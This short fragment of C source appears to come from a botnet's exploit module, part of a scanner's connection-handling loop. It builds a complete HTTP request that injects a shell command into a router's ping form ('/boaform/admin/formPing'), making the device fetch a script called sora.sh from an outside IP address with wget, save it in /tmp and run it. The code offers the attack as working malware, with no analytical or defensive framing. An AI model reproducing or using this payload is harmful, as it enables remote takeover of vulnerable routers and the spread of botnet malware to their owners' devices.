            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    ...
                    if(conn->state == netlink_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "GET /boaform/admin/formPing?target_addr=;wget%20http://5.181.80.188/sora.sh%20-O%20-%3E%20/tmp/jno;sh%20/tmp/jno%27/&waninf=1_INTERNET_R_VID_154$ HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: Hello, World\r\n\r\n");
